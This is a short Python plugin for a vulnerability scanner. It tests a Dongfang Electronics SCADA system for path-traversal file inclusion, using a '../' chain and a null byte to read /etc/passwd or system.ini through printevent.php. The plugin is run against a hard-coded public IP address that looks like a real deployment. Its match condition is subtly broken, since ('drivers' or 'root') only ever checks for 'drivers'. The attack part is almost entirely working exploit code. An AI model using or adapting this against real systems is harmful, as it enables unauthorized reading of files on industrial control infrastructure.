#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = 东方电子SCADA通用系统文件包含


def assign(service, arg):
    if service == "dfe_scada":
        return True, arg

def audit(arg):
   keys = ['windows/system.ini','etc/passwd']
   for key in keys:
        path = '../'*20
        target ="{url}/modules/event/server/printevent.php?action={path}{key}%00.htm".format(url=arg,path=path,key=key)
        code, head,res, errcode, _   = curl.curl2(target) 
        if code == 200 and ('drivers' or 'root') in res:
            security_hole(target)
            break
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('dfe_scada', 'http://221.214.179.228:5000')[1])